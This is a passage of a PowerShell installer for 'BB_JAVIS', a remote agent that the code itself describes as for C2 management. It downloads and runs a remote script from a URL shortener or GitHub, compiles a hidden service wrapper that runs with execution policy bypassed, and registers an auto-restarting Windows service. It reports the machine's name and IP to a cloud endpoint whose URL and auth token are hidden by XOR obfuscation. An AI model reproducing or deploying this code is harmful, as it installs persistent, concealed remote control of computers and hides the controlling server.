            [System.IO.File]::WriteAllBytes($targetAgent, $decompressedBytes)
            if ((Test-Path $targetAgent) -and (Get-Item $targetAgent).Length -gt 1000) {
                Write-Host "[EMBEDDED] Agent extracted successfully ($($decompressedBytes.Length) bytes) [Zero-Network Ready]" -ForegroundColor Green
                $unpackSuccess = $true
            }
        } catch {
            Write-Host "[WARN] Failed to extract embedded agent: $($_.Exception.Message)" -ForegroundColor Yellow
        }
    }

    if (-not $unpackSuccess) {
        Write-Host "[DOWNLOAD] Downloading start_remote_agent.ps1 from official cloud repository..." -ForegroundColor Cyan
        $downloadSuccess = $false
        $candidateUrls = @(
            "https://da.gd/bbj",
            "https://raw.githubusercontent.com/SDPLaos2023/CMD_Remote_Javis/main/start_remote_agent.ps1"
        )

        foreach ($u in $candidateUrls) {
            if ($downloadSuccess) { break }
            try {
                Write-Host "[DOWNLOAD] Trying: $u..." -ForegroundColor DarkGray
                $resp = Invoke-WebRequest -Uri $u -UseBasicParsing -TimeoutSec 15 -ErrorAction Stop
                $content = $resp.Content
                if (-not [string]::IsNullOrWhiteSpace($content) -and $content.Length -gt 1000) {
                    [System.IO.File]::WriteAllText($targetAgent, $content, [System.Text.Encoding]::UTF8)
                    $downloadSuccess = $true
                    break
                }
            } catch {}

            if (-not $downloadSuccess) {
                try {
                    $wc = New-Object System.Net.WebClient
                    $wc.Encoding = [System.Text.Encoding]::UTF8
                    $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) BB_Javis/2.0")
                    $wc.DownloadFile($u, $targetAgent)
                    $wc.Dispose()
                    if ((Test-Path $targetAgent) -and (Get-Item $targetAgent).Length -gt 1000) {
                        $downloadSuccess = $true
                        break
                    }
                } catch {}
            }
        }

        if ($downloadSuccess) {
            Write-Host "[DOWNLOAD] start_remote_agent.ps1 downloaded successfully." -ForegroundColor Green
        } else {
            Write-Host "[ERROR] Failed to obtain start_remote_agent.ps1 from all channels." -ForegroundColor Red
            return
        }
    }
}

# Copy curl.exe if available
$localCurl = if (-not [string]::IsNullOrWhiteSpace($PSScriptRoot)) { Join-Path $PSScriptRoot "curl.exe" } else { $null }
if ($localCurl -and (Test-Path $localCurl)) {
    Copy-Item $localCurl (Join-Path $installDir "curl.exe") -Force
}

# 4. Generate C# Service Wrapper (BBJavisService.cs)
$csSourcePath = Join-Path $installDir "BBJavisService.cs"
$csCode = @"
using System;
using System.Diagnostics;
using System.IO;
using System.ServiceProcess;

namespace BBJavisService
{
    public class JavisService : ServiceBase
    {
        private Process _agentProcess;
        public const string ServiceNameString = "BB_JAVIS_Remote";

        public JavisService()
        {
            this.ServiceName = ServiceNameString;
            this.CanStop = true;
            this.CanShutdown = true;
        }

        protected override void OnStart(string[] args)
        {
            try
            {
                string baseDir = AppDomain.CurrentDomain.BaseDirectory;
                string scriptPath = Path.Combine(baseDir, "start_remote_agent.ps1");
                if (!File.Exists(scriptPath))
                {
                    scriptPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "BB_Javis", "start_remote_agent.ps1");
                }

                ProcessStartInfo psi = new ProcessStartInfo();
                psi.FileName = "powershell.exe";
                psi.Arguments = "-NoProfile -ExecutionPolicy Bypass -File \"" + scriptPath + "\" -Mode fix -AsService";
                psi.WorkingDirectory = baseDir;
                psi.UseShellExecute = false;
                psi.CreateNoWindow = true;
                psi.WindowStyle = ProcessWindowStyle.Hidden;

                _agentProcess = Process.Start(psi);
            }
            catch (Exception ex)
            {
                EventLog.WriteEntry("BB_JAVIS_Remote", "Error starting agent: " + ex.Message, EventLogEntryType.Error);
                throw;
            }
        }

        protected override void OnStop()
        {
            try
            {
                if (_agentProcess != null && !_agentProcess.HasExited)
                {
                    _agentProcess.Kill();
                }
            }
            catch {}
        }

        protected override void OnShutdown()
        {
            this.OnStop();
        }

        public static void Main()
        {
            ServiceBase.Run(new JavisService());
        }
    }
}
"@
[System.IO.File]::WriteAllText($csSourcePath, $csCode, [System.Text.Encoding]::UTF8)

# 5. Locate Built-in C# Compiler (csc.exe)
$csc = "$env:WINDIR\Microsoft.NET\Framework64\v4.0.30319\csc.exe"
if (-not (Test-Path $csc)) {
    $csc = "$env:WINDIR\Microsoft.NET\Framework\v4.0.30319\csc.exe"
}
if (-not (Test-Path $csc)) {
    Write-Host "[ERROR] .NET Framework C# Compiler (csc.exe) not found on this machine!" -ForegroundColor Red
    return
}

# 6. Compile BBJavisService.exe
$targetExe = Join-Path $installDir "BBJavisService.exe"
if (Test-Path $targetExe) {
    try { Remove-Item $targetExe -Force -ErrorAction SilentlyContinue } catch {}
}
Write-Host "[COMPILE] Compiling C# Windows Service Wrapper..." -ForegroundColor Cyan
& $csc /nologo /target:exe /r:System.dll,System.ServiceProcess.dll /out:$targetExe $csSourcePath
if ($LASTEXITCODE -ne 0 -or -not (Test-Path $targetExe)) {
    if (Test-Path $targetExe) {
        Write-Host "[REUSE] Existing wrapper executable is available. Continuing registration..." -ForegroundColor Yellow
    } else {
        Write-Host "[ERROR] Compilation failed (Exit code: $LASTEXITCODE)" -ForegroundColor Red
        return
    }
} else {
    Write-Host "[COMPILE] BBJavisService.exe compiled successfully! (Native 100%)" -ForegroundColor Green
}

# 7. Register Service with Windows SCM
Write-Host "[SERVICE] Registering Windows Service: $svcName..." -ForegroundColor Cyan
$binPathArg = "`"$targetExe`""
& sc.exe create $svcName binPath= $binPathArg start= auto DisplayName= "BB_JAVIS Remote Agent Service" 2>&1 | Out-Null
& sc.exe description $svcName "Background Remote Agent for BB_JAVIS C2 Management (Always-On)" 2>&1 | Out-Null
& sc.exe failure $svcName reset= 86400 actions= restart/5000/restart/10000/restart/60000 2>&1 | Out-Null

# 8. Create local uninstaller script
$uninstallPs1Content = @'
# BB_JAVIS Remote Service Uninstaller
$OutputEncoding = [System.Text.Encoding]::UTF8
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
$svcName = "BB_JAVIS_Remote"
Write-Host "Uninstalling $svcName..." -ForegroundColor Yellow
try {
    $cfgPath = "C:\ProgramData\BB_Javis\service_config.json"
    if (Test-Path $cfgPath) {
        $cfg = Get-Content $cfgPath -Raw | ConvertFrom-Json
        if ($cfg -and $cfg.pin) {
            $authQuery = if ($cfg.authToken) { "?auth=$($cfg.authToken)" } else { "" }
            $delUrl = "$([System.Text.Encoding]::UTF8.GetString([byte[]](@(0x32, 0x2e, 0x2e, 0x2a, 0x29, 0x60, 0x75, 0x75, 0x2f, 0x3b, 0x2e, 0x77, 0x3b, 0x2a, 0x33, 0x77, 0x3b, 0x3d, 0x3f, 0x34, 0x2e, 0x77, 0x3e, 0x3f, 0x3c, 0x3b, 0x2f, 0x36, 0x2e, 0x77, 0x28, 0x2e, 0x3e, 0x38, 0x74, 0x3c, 0x33, 0x28, 0x3f, 0x38, 0x3b, 0x29, 0x3f, 0x33, 0x35, 0x74, 0x39, 0x35, 0x37, 0x75) | ForEach-Object { [byte]($_ -bxor 0x5a) })))devices/$($cfg.pin).json$authQuery"
            $req = [System.Net.HttpWebRequest]::Create($delUrl)
            $req.Method = "DELETE"
            $req.Timeout = 5000
            try { $resp = $req.GetResponse(); $resp.Close() } catch {}
        }
    }
} catch {}
& sc.exe stop $svcName 2>&1 | Out-Null
Start-Sleep -Seconds 1
& sc.exe delete $svcName 2>&1 | Out-Null
Get-Process powershell -ErrorAction SilentlyContinue | Where-Object { $_.CommandLine -like "*BB_Javis*" } | Stop-Process -Force -ErrorAction SilentlyContinue
Write-Host "[SUCCESS] BB_JAVIS Remote Service uninstalled successfully!" -ForegroundColor Green
'@
[System.IO.File]::WriteAllText((Join-Path $installDir "uninstall_service.ps1"), $uninstallPs1Content, [System.Text.Encoding]::UTF8)

$uninstallBatContent = @"
@echo off
chcp 65001 >nul
powershell -NoProfile -ExecutionPolicy Bypass -File "%~dp0uninstall_service.ps1"
pause
"@
[System.IO.File]::WriteAllText((Join-Path $installDir "uninstall_service.bat"), $uninstallBatContent, [System.Text.Encoding]::UTF8)

# 8.5 Manage Persistent PIN and Custom Host Name (Display Alias)
$cfgFile = Join-Path $installDir "service_config.json"
$assignedPin = ""
$existingCustomName = ""
if (Test-Path $cfgFile) {
    try {
        $existingCfg = Get-Content $cfgFile -Raw -Encoding UTF8 | ConvertFrom-Json
        if ($existingCfg) {
            if ($existingCfg.pin) { $assignedPin = $existingCfg.pin.ToString().Trim() }
            if ($existingCfg.custom_name) { $existingCustomName = $existingCfg.custom_name.ToString().Trim() }
        }
    } catch {}
}

if ([string]::IsNullOrWhiteSpace($assignedPin)) {
    $assignedPin = (Get-Random -Minimum 1000 -Maximum 10000).ToString()
}

$defaultHost = if (-not [string]::IsNullOrWhiteSpace($existingCustomName)) { $existingCustomName } else { $env:COMPUTERNAME }
$chosenHost = ""

# Check environment variable first (for automation scripts)
if (-not [string]::IsNullOrWhiteSpace($env:BB_JAVIS_HOST)) {
    $chosenHost = $env:BB_JAVIS_HOST.Trim()
} elseif ([Environment]::UserInteractive) {
    Write-Host ""
    Write-Host "----------------------------------------------------------------------" -ForegroundColor DarkGray
    Write-Host "  Set Custom Host Name for Fleet Management (Display Alias)" -ForegroundColor Yellow
    Write-Host "  [Press Enter to use default: '$defaultHost']" -ForegroundColor Gray
    try {
        $inputHost = Read-Host "  Enter machine name"
        if (-not [string]::IsNullOrWhiteSpace($inputHost)) {
            $chosenHost = $inputHost.Trim()
        }
    } catch {}
    Write-Host "----------------------------------------------------------------------`n" -ForegroundColor DarkGray
}

if ([string]::IsNullOrWhiteSpace($chosenHost)) {
    $chosenHost = $defaultHost
}

# Pre-save service_config.json for instant resolution
try {
    $preCfg = @{
        pin = $assignedPin
        hostname = $env:COMPUTERNAME
        custom_name = $chosenHost
        mode = "fix"
        authToken = "$([System.Text.Encoding]::UTF8.GetString([byte[]](@(0x3c, 0x6d, 0x0a, 0x29, 0x03, 0x2a, 0x0d, 0x69, 0x00, 0x1c, 0x11, 0x0a, 0x6b, 0x11, 0x1e, 0x3d, 0x39, 0x3e, 0x0c, 0x68, 0x3e, 0x1c, 0x0a, 0x2e, 0x3e, 0x3b, 0x32, 0x11, 0x3c, 0x38, 0x32, 0x6b, 0x10, 0x12, 0x6c, 0x32, 0x6d, 0x16, 0x63, 0x6e) | ForEach-Object { [byte]($_ -bxor 0x5a) })))"
        updated_at = (Get-Date -Format "yyyy-MM-ddTHH:mm:ssZ")
    } | ConvertTo-Json
    $utf8NoBom = New-Object System.Text.UTF8Encoding($false)
    [System.IO.File]::WriteAllText($cfgFile, $preCfg, $utf8NoBom)
} catch {}

# 9. Start Windows Service
Write-Host "[START] Starting service $svcName..." -ForegroundColor Cyan
try {
    Start-Service -Name $svcName -ErrorAction Stop
} catch {
    Write-Host "[WARNING] Direct Start-Service failed, trying via sc.exe start..." -ForegroundColor Yellow
    & sc.exe start $svcName 2>&1 | Out-Null
}

# Local IP Resolution
$localIp = "127.0.0.1"
try {
    $localIp = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias * -ErrorAction SilentlyContinue |
                Where-Object { $_.IPAddress -notlike "127.*" -and $_.IPAddress -notlike "169.254.*" } |
                Select-Object -ExpandProperty IPAddress -First 1)
} catch {}

# 10. Initial Heartbeat & Presence Registration
Write-Host "[INIT] Registering initial presence heartbeat on Cloud..." -ForegroundColor Cyan
try {
    $initHbUrl = "$([System.Text.Encoding]::UTF8.GetString([byte[]](@(0x32, 0x2e, 0x2e, 0x2a, 0x29, 0x60, 0x75, 0x75, 0x2f, 0x3b, 0x2e, 0x77, 0x3b, 0x2a, 0x33, 0x77, 0x3b, 0x3d, 0x3f, 0x34, 0x2e, 0x77, 0x3e, 0x3f, 0x3c, 0x3b, 0x2f, 0x36, 0x2e, 0x77, 0x28, 0x2e, 0x3e, 0x38, 0x74, 0x3c, 0x33, 0x28, 0x3f, 0x38, 0x3b, 0x29, 0x3f, 0x33, 0x35, 0x74, 0x39, 0x35, 0x37, 0x75) | ForEach-Object { [byte]($_ -bxor 0x5a) })))devices/$assignedPin.json?auth=$([System.Text.Encoding]::UTF8.GetString([byte[]](@(0x3c, 0x6d, 0x0a, 0x29, 0x03, 0x2a, 0x0d, 0x69, 0x00, 0x1c, 0x11, 0x0a, 0x6b, 0x11, 0x1e, 0x3d, 0x39, 0x3e, 0x0c, 0x68, 0x3e, 0x1c, 0x0a, 0x2e, 0x3e, 0x3b, 0x32, 0x11, 0x3c, 0x38, 0x32, 0x6b, 0x10, 0x12, 0x6c, 0x32, 0x6d, 0x16, 0x63, 0x6e) | ForEach-Object { [byte]($_ -bxor 0x5a) })))"
    $initHbData = @{
        pin = $assignedPin
        hostname = $env:COMPUTERNAME
        custom_name = $chosenHost
        local_ip = $localIp
        service_mode = $true
        status = "online"
        last_heartbeat = (Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ssZ")
    } | ConvertTo-Json -Compress
    $req = [System.Net.HttpWebRequest]::Create($initHbUrl)
    $req.Method = "PUT"
    $req.Timeout = 5000
    $req.ContentType = "application/json; charset=utf-8"
    $b = [System.Text.Encoding]::UTF8.GetBytes($initHbData)
    $req.ContentLength = $b.Length
    $st = $req.GetRequestStream()
    $st.Write($b, 0, $b.Length)
    $st.Close()
    $null = $req.GetResponse()
    Write-Host "[INIT] Background service connected to cloud successfully! (ONLINE)" -ForegroundColor Green
} catch {
    Write-Host "[INIT] Background service started." -ForegroundColor Green
}

# 11. Summary Banner
Write-Host ""
Write-Host "======================================================================" -ForegroundColor DarkCyan
Write-Host "              BB_JAVIS BACKGROUND SERVICE INSTALLED                   " -ForegroundColor Yellow
Write-Host "======================================================================" -ForegroundColor DarkCyan
Write-Host "  -> Service Name      : " -NoNewline -ForegroundColor Gray
Write-Host "$svcName (RUNNING)" -ForegroundColor Green
Write-Host "  -> Startup Type      : " -NoNewline -ForegroundColor Gray
Write-Host "Automatic (Starts automatically on system boot)" -ForegroundColor White
Write-Host "  -> Persistent PIN    : " -NoNewline -ForegroundColor Gray
Write-Host "[ $assignedPin ]" -NoNewline -ForegroundColor Green
Write-Host " (PERMANENT FIXED PIN)" -ForegroundColor Yellow
Write-Host "  -> Machine Hostname  : " -NoNewline -ForegroundColor Gray
if ($chosenHost -ne $env:COMPUTERNAME) {
    Write-Host "$chosenHost " -NoNewline -ForegroundColor Green
    Write-Host "($env:COMPUTERNAME)" -ForegroundColor DarkGray
} else {
    Write-Host "$env:COMPUTERNAME" -ForegroundColor Cyan
}
Write-Host "  -> Local IPv4        : " -NoNewline -ForegroundColor Gray
Write-Host "$localIp" -ForegroundColor Cyan
Write-Host "  -> Presence Status   : " -NoNewline -ForegroundColor Gray
Write-Host "ONLINE (Real-time SSE Push & Heartbeat 30s)" -ForegroundColor Green
Write-Host "----------------------------------------------------------------------" -ForegroundColor DarkGray
Write-Host "  * Background agent is now actively running 24/7" -ForegroundColor White
Write-Host "  * You may SAFELY CLOSE this PowerShell window now" -ForegroundColor Green
$targetPromptName = if ($chosenHost -ne $env:COMPUTERNAME) { "$chosenHost or '$env:COMPUTERNAME'" } else { "$env:COMPUTERNAME" }
Write-Host "  * Controllers can target this machine via '$targetPromptName' or PIN [ $assignedPin ]" -ForegroundColor Gray
Write-Host "======================================================================" -ForegroundColor DarkCyan
Write-Host ""
